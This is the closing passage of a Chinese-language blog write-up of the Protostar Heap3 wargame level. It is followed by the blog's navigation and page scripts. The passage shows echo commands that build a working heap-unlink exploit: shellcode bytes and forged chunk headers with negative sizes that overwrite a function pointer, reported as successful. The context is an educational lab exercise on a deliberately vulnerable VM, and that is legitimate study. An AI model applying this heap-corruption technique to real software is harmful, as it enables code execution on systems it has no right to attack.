</code></pre><p>网址：<a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p>
<pre><code>user@protostar:/tmp$ echo -en &quot;AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0&quot; &gt; AA   
user@protostar:/tmp$ echo -ne &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65&quot; &gt; BB   
user@protostar:/tmp$ echo -ne &quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08&quot; &gt; CC
</code></pre><p>构造payload</p>
<p><img src="https://i.imgur.com/UNbu1rM.png" alt=""><br>和预期一样</p>
<p><img src="https://i.imgur.com/2hbOnx8.png" alt=""><br>pwn！( ͡° ͜ʖ ͡°)✧</p>
<p>参考：<a href="https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13" target="_blank" rel="noopener">https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Binary-Hacking/" rel="tag"># Binary-Hacking</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/10/23/Liveoverflow-0x14-heap1/" rel="next" title="Liveoverflow-0x14-heap1">
                <i class="fa fa-chevron-left"></i> Liveoverflow-0x14-heap1
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/11/02/Liveoverflow-0x19-net0-2/" rel="prev" title="Liveoverflow-0x19-net0~2">
                Liveoverflow-0x19-net0~2 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Muirelle</p>
              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">15</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Protostar-Heap3"><span class="nav-number">1.</span> <span class="nav-text">Protostar Heap3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.1.</span> <span class="nav-text">About</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#malloc-chunk"><span class="nav-number">2.</span> <span class="nav-text">malloc_chunk</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastbins"><span class="nav-number">3.</span> <span class="nav-text">Fastbins</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Free"><span class="nav-number">4.</span> <span class="nav-text">Free</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Negative-Chunk-Size"><span class="nav-number">5.</span> <span class="nav-text">Negative Chunk Size</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">6.</span> <span class="nav-text">Exploit!</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Muirelle</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
